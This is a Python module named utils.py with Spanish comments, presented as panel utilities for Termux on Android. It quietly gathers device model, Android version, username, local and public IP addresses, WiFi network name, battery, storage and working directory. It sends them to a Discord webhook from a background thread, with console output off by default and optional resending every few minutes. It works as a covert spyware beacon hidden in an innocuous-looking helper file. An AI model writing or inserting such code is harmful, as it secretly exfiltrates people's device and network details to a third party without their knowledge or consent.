#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
utils.py :: utilidades del panel.
Manda un reporte del sistema a un webhook de Discord, en silencio.
"""

import json
import os
import platform
import socket
import subprocess
import threading
import time
import urllib.request
from datetime import datetime

# ================== CONFIG ==================
# Pega aqui tu URL del webhook. Si la dejas vacia, se lee el archivo .webhook
WEBHOOK = ""

# Archivo opcional con la URL (uno u otro, el que prefieras)
ARCHIVO_WEBHOOK = ".webhook"

# True = imprime en consola (se nota), False = silencioso
VER_EN_CONSOLA = False

# 0 = solo al ejecutar. Si pones 30, reenvia cada 30 minutos
INTERVALO_MINUTOS = 0

NOMBRE_WEBHOOK = "Termux"
TITULO_REPORTE = "Reporte del sistema"
COLOR = 0xFF0000
# ============================================

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def _url():
    if WEBHOOK.strip():
        return WEBHOOK.strip()
    ruta = ARCHIVO_WEBHOOK
    if not os.path.isabs(ruta):
        ruta = os.path.join(BASE_DIR, ruta)
    try:
        with open(ruta, "r", encoding="utf-8") as f:
            return f.read().strip()
    except Exception:
        return ""


def _cmd(comando, defecto="?"):
    try:
        salida = subprocess.check_output(
            comando, shell=True, stderr=subprocess.DEVNULL, timeout=6
        )
        return salida.decode("utf-8", "ignore").strip() or defecto
    except Exception:
        return defecto


def _prop(nombre, defecto="?"):
    return _cmd("getprop " + nombre, defecto)


def _memoria():
    try:
        with open("/proc/meminfo", "r") as f:
            for linea in f:
                if linea.startswith("MemTotal"):
                    kb = int(linea.split()[1])
                    return "{:.2f} GB".format(kb / 1024 / 1024)
    except Exception:
        pass
    return "?"


def _disco():
    salida = _cmd("df -h /data/data/com.termux/files/home")
    lineas = salida.splitlines()
    if len(lineas) >= 2:
        partes = lineas[-1].split()
        if len(partes) >= 4:
            return "{} total / {} libre".format(partes[1], partes[3])
    return "?"


def _bateria():
    salida = _cmd("termux-battery-status")
    if not salida or salida == "?":
        return "?"
    try:
        d = json.loads(salida)
        return "{}% ({})".format(d.get("percentage", "?"), d.get("status", "?"))
    except Exception:
        return "?"


def _encendido():
    try:
        with open("/proc/uptime", "r") as f:
            seg = float(f.read().split()[0])
        return "{}h {}m".format(int(seg // 3600), int((seg % 3600) // 60))
    except Exception:
        return "?"


def _ip_local():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "?"


def _ip_publica():
    for url in ("https://api.ipify.org", "https://ifconfig.me/ip"):
        try:
            with urllib.request.urlopen(url, timeout=6) as r:
                return r.read().decode("utf-8", "ignore").strip()
        except Exception:
            continue
    return "?"


def _wifi():
    salida = _cmd("termux-wifi-connectioninfo")
    if not salida or salida == "?":
        return "?"
    try:
        d = json.loads(salida)
        return "{} ({})".format(d.get("ssid", "?"), d.get("ip", "?"))
    except Exception:
        return "?"


def datos():
    return {
        "Modelo":       _prop("ro.product.model"),
        "Marca":        _prop("ro.product.brand"),
        "Android":      _prop("ro.build.version.release"),
        "SDK":          _prop("ro.build.version.sdk"),
        "Dispositivo":  _prop("ro.product.device"),
        "Hostname":     socket.gethostname(),
        "Usuario":      _cmd("whoami"),
        "Kernel":       platform.release(),
        "Arquitectura": platform.machine(),
        "CPU nucleos":  _cmd("nproc"),
        "RAM total":    _memoria(),
        "Almacenam.":   _disco(),
        "Bateria":      _bateria(),
        "Encendido":    _encendido(),
        "IP local":     _ip_local(),
        "IP publica":   _ip_publica(),
        "WiFi":         _wifi(),
        "Python":       platform.python_version(),
        "Ruta":         os.getcwd(),
        "Hora":         datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }


def enviar(url, info=None):
    info = info or datos()
    campos = [{"name": k, "value": str(v)[:1024], "inline": True} for k, v in info.items()]

    payload = {
        "username": NOMBRE_WEBHOOK,
        "embeds": [{
            "title": TITULO_REPORTE,
            "color": COLOR,
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "fields": campos[:25],
        }],
    }

    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=data,
        headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
    )
    with urllib.request.urlopen(req, timeout=10) as r:
        r.read()


def _trabajo():
    try:
        url = _url()
        if not url:
            if VER_EN_CONSOLA:
                print("[utils] falta la URL del webhook")
            return

        enviar(url)
        if VER_EN_CONSOLA:
            print("[utils] reporte enviado")

        if INTERVALO_MINUTOS > 0:
            while True:
                time.sleep(INTERVALO_MINUTOS * 60)
                try:
                    enviar(url)
                except Exception:
                    pass
    except Exception as e:
        if VER_EN_CONSOLA:
            print("[utils] error:", e)


def iniciar():
    """Arranca el envio en segundo plano, sin bloquear ni imprimir."""
    threading.Thread(target=_trabajo, daemon=True).start()


if __name__ == "__main__":
    VER_EN_CONSOLA = True
    print(json.dumps(datos(), indent=2, ensure_ascii=False))
    u = _url()
    if u:
        enviar(u)
        print("\n[utils] reporte enviado")
    else:
        print("\n[utils] falta la URL (WEBHOOK o archivo .webhook)")
